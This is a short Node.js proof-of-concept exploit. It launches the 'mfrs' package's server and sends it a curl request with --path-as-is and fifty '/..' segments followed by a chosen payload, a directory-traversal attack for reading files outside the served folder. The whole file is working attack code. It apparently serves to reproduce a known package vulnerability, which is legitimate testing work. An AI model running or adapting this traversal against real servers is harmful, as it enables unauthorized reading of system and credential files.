function exploitFunction(payload) {
  const { exec } = require("child_process");
  const sleep = require("sleep");

  const genstr = (n) => "/..".repeat(50) + payload;

  let server = "node ./node_modules/mfrs/index.js";
  let exe = exec(server, (error, stdout) => {
    if (error) throw error;
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr()}"`;
    exec(attack_string, (error, stdout) => {
      if (error) throw error;
      return stdout;
    });
  });

  sleep.sleep(2);
}

module.exports = { exploitFunction };